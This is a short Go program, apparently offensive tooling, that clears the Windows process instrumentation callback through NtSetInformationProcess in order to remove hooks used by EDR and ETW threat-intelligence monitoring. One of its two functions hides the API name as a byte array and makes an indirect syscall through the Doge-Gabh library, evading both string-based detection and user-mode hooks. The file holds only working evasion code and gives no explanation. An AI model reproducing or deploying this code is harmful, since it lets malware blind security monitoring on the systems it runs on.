package main

import (
	"bufio"
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"os"
	"syscall"
	"unsafe"
)

const ProcessInstrumentationCallback = 0x28

type PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION struct {
	Version  uint32
	Reserved uint32
	Callback uintptr
}

func etwtiUnhook() {
	var InstrumentationCallbackInfo PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
	InstrumentationCallbackInfo.Version = 0
	InstrumentationCallbackInfo.Reserved = 0
	InstrumentationCallbackInfo.Callback = 0

	NtSetInformationProcess := syscall.NewLazyDLL("ntdll").NewProc("NtSetInformationProcess")
	r, _, _ := NtSetInformationProcess.Call(
		uintptr(0xffffffffffffffff),
		ProcessInstrumentationCallback,
		uintptr(unsafe.Pointer(&InstrumentationCallbackInfo)),
		unsafe.Sizeof(InstrumentationCallbackInfo))
	if r != 0 {
		fmt.Printf("0x%x\n", r)
	}

}

func etwtiUnhookSyscall() {
	var InstrumentationCallbackInfo PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
	InstrumentationCallbackInfo.Version = 0
	InstrumentationCallbackInfo.Reserved = 0
	InstrumentationCallbackInfo.Callback = 0

	NtSetInformationProcess, _ := gabh.GetSSNByNameExcept(string([]byte{'N', 't', 'S', 'e', 't', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's'}), func(a string) string { return a })

	callAddr := gabh.GetRecyCall(string([]byte{'N', 't', 'S', 'e', 't', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's'}), nil, nil)
	r, e1 := gabh.ReCycall(uint16(NtSetInformationProcess),
		callAddr,
		uintptr(0xffffffffffffffff),
		ProcessInstrumentationCallback,
		uintptr(unsafe.Pointer(&InstrumentationCallbackInfo)),
		unsafe.Sizeof(InstrumentationCallbackInfo))
	if e1 != nil {
		fmt.Printf("0x%x\n", r)
		fmt.Println(e1)
	}

}

func main() {
	etwtiUnhook()

	fmt.Print("Press 'Enter' to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}
